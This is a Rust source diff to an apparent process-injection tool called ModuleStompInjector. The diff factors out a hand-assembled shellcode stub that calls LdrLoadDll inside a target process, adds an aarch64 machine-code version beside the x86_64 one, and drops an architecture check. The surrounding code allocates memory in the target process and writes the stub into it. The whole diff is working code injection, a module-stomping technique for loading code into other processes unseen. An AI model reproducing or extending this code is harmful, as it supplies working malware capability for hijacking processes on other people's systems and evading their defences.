@@ -50,6 +50,56 @@ macro_rules! nt_read_proc {
     }};
 }
 
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn build_ldr_load_dll_stub(ldr_addr: u64, us_struct_va: u64, base_out_va: u64) -> Vec<u8> {
+    let mut stub = Vec::<u8>::with_capacity(64);
+    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
+    stub.extend_from_slice(&[0x33, 0xC9]); // xor ecx, ecx
+    stub.extend_from_slice(&[0x33, 0xD2]); // xor edx, edx
+    stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, <us_struct_va>
+    stub.extend_from_slice(&us_struct_va.to_le_bytes());
+    stub.extend_from_slice(&[0x49, 0xB9]); // mov r9, <base_out_va>
+    stub.extend_from_slice(&base_out_va.to_le_bytes());
+    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ldr_addr>
+    stub.extend_from_slice(&ldr_addr.to_le_bytes());
+    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
+    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
+    stub.push(0xC3); // ret
+    stub
+}
+
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn build_ldr_load_dll_stub(ldr_addr: u64, us_struct_va: u64, base_out_va: u64) -> Vec<u8> {
+    fn emit_word(out: &mut Vec<u8>, word: u32) {
+        out.extend_from_slice(&word.to_le_bytes());
+    }
+
+    fn emit_mov_imm64(out: &mut Vec<u8>, reg: u32, value: u64) {
+        let parts = [
+            (value & 0xFFFF) as u32,
+            ((value >> 16) & 0xFFFF) as u32,
+            ((value >> 32) & 0xFFFF) as u32,
+            ((value >> 48) & 0xFFFF) as u32,
+        ];
+        for (idx, imm) in parts.iter().enumerate() {
+            let base = if idx == 0 { 0xD280_0000 } else { 0xF280_0000 };
+            emit_word(out, base | ((idx as u32) << 21) | (imm << 5) | reg);
+        }
+    }
+
+    let mut stub = Vec::<u8>::with_capacity(96);
+    emit_word(&mut stub, 0xD100_83FF); // sub sp, sp, #0x20
+    emit_mov_imm64(&mut stub, 0, 0); // x0 = SearchPath = NULL
+    emit_mov_imm64(&mut stub, 1, 0); // x1 = DllCharacteristics = NULL
+    emit_mov_imm64(&mut stub, 2, us_struct_va); // x2 = DllName
+    emit_mov_imm64(&mut stub, 3, base_out_va); // x3 = BaseAddress
+    emit_mov_imm64(&mut stub, 16, ldr_addr); // x16 = LdrLoadDll
+    emit_word(&mut stub, 0xD63F_0200); // blr x16
+    emit_word(&mut stub, 0x9100_83FF); // add sp, sp, #0x20
+    emit_word(&mut stub, 0xD65F_03C0); // ret
+    stub
+}
+
 /// Build a `Vec<DllCandidate>` by walking the InLoadOrderModuleList of the
 /// **target** process's PEB.  Each candidate's `.text` section must be at
 /// least `min_text_size` bytes and the DLL must not match any exclusion.
@@ -267,14 +317,6 @@ impl Injector for ModuleStompInjector {
             };
         }
 
-        // The shellcode stub built below is x86_64 machine code.  Reject the
-        // call at runtime on any other architecture to prevent the CPU from
-        // executing garbage bytes (L-05 fix).
-        #[cfg(not(target_arch = "x86_64"))]
-        return Err(anyhow!(
-            "ModuleStompInjector: shellcode stub requires x86_64; unsupported architecture"
-        ));
-
         // ── Load configuration ─────────────────────────────────────────────
         let injection_cfg = &crate::config::load_config()
             .map(|c| c.injection)
@@ -459,7 +501,6 @@ impl Injector for ModuleStompInjector {
                         continue;
                     }
 
-                    // Build x64 stub for LdrLoadDll
                     let stub_region = nt_alloc_proc!(h_proc, 256, PAGE_READWRITE);
                     if stub_region.is_null() {
                         log::warn!(
@@ -475,19 +516,7 @@ impl Injector for ModuleStompInjector {
                     let us_struct_va = us_va + us_offset as u64;
                     let base_out_va = us_va + base_addr_offset as u64;
 
-                    let mut stub = Vec::<u8>::with_capacity(64);
-                    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
-                    stub.extend_from_slice(&[0x33, 0xC9]); // xor ecx, ecx
-                    stub.extend_from_slice(&[0x33, 0xD2]); // xor edx, edx
-                    stub.extend_from_slice(&[0x49, 0xB8]); // mov r8, <us_struct_va>
-                    stub.extend_from_slice(&us_struct_va.to_le_bytes());
-                    stub.extend_from_slice(&[0x49, 0xB9]); // mov r9, <base_out_va>
-                    stub.extend_from_slice(&base_out_va.to_le_bytes());
-                    stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ldr_addr>
-                    stub.extend_from_slice(&ldr_addr.to_le_bytes());
-                    stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
-                    stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
-                    stub.push(0xC3); // ret
+                    let stub = build_ldr_load_dll_stub(ldr_addr, us_struct_va, base_out_va);
 
                     let (s, _) = nt_write_proc!(h_proc, stub_region, stub.as_ptr(), stub.len());
                     if s < 0 {
